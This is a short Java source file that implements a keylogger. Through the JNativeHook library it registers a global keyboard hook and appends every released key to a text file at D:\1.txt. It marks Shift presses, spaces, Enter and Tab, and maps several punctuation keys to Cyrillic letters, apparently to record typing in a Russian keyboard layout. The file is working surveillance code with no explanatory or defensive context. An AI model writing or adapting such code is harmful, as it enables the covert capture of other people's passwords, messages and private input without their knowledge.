import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main implements NativeKeyListener {

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new Main());
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            FileWriter writer = new FileWriter("D:\\1.txt", true);
            if (e.getKeyCode() == 0xe36 || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Shift"))
                writer.write("(Shift Pressed)");
            writer.flush();
        } catch (IOException e1) {
            e1.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
            FileWriter writer = new FileWriter("D:\\1.txt", true);
            if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space"))
                writer.write(" ");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Enter"))
                writer.write("\r" + "\n");
            else if (e.getKeyCode() == 0xe36 || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Shift"))
                writer.write("(Shift Released)");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Semicolon"))
                writer.write("Ж");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Open Bracket"))
                writer.write("Х");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Comma"))
                writer.write("(, Б)");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Period"))
                writer.write("(. Ю)");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Slash"))
                writer.write("(. ,)");
            else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Tab"))
                writer.write("  --Tab--  ");
            else
                writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
            writer.flush();
        } catch (IOException e1) {
            e1.printStackTrace();
        }
    }
}